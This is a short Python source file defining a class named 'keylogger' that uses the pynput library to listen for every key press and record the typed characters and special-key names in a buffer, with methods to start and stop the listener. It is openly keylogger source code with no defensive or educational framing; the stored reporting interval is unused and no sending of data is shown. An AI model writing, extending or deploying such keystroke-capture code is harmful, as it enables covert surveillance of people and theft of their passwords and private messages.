from pynput import keyboard

class keylogger():
    def __init__(self, interval: int = 60) -> None:
        self.buffer = ""
        self.updateInt = interval
        self.listener = keyboard.Listener(on_press=self.onPressCallback,)

    def onPressCallback(self, key) -> None:
        if key == None: 
            return
        try: 
            self.buffer += key.char
        except AttributeError:
            self.buffer += "[{}]".format(str(key)[4:])

    def start(self) -> None:
        self.listener.start()

    def stop(self) -> None:
        self.listener.stop()
